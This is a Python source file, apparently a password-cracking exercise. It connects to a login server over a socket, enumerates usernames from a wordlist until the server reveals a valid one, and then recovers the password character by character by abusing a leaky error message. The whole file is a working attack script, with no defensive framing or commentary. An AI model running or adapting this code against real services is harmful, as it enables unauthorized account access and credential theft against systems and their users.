import itertools
import os
import string
import sys
import socket
import json


def upperLowerPossibilities(word: str) -> list:
    return list(map(''.join, itertools.product(*zip(word.upper(), word.lower()))))


def loginJson(login: str, password: str) -> object:
    loginDictionary = {"login": login, "password": password}
    return json.dumps(loginDictionary)


def getJsonResult(jsonString: object) -> object:
    result = json.loads(jsonString)
    return result["result"]



# get command line arguments
arguments = sys.argv
ipaddress = arguments[1]
port = int(arguments[2])

# get current working directory
currentWorkingDirectory = os.getcwd()

# open password file
logins = open(currentWorkingDirectory + "\\logins.txt")
passwords = open(currentWorkingDirectory + "\\passwords.txt")

address = (ipaddress, port)

# create socket
clientSocket = socket.socket()
clientSocket.connect(address)


# find correct login
for login in logins:
    login = login.strip("\n")
    clientSocket.send(str(loginJson(login, "")).encode())
    response = clientSocket.recv(1024)
    response = response.decode()
    # print(response)

    if getJsonResult(response) == "Wrong password!":
        correctLogin = login
        break

# find password
alphabet = string.ascii_lowercase + string.ascii_uppercase
numbers = "".join([str(i) for i in range(10)])
letters = alphabet + numbers

password = ""

while True:
    for letter in letters:
        temporaryPassword = password + letter
        clientSocket.send(str(loginJson(correctLogin, temporaryPassword)).encode())
        response = clientSocket.recv(1024)
        response = response.decode()
        if getJsonResult(response) == "Exception happened during login":
            password = temporaryPassword
            break
        elif getJsonResult(response) == "Connection success!":
            print(loginJson(correctLogin, temporaryPassword))
            clientSocket.close()
            sys.exit()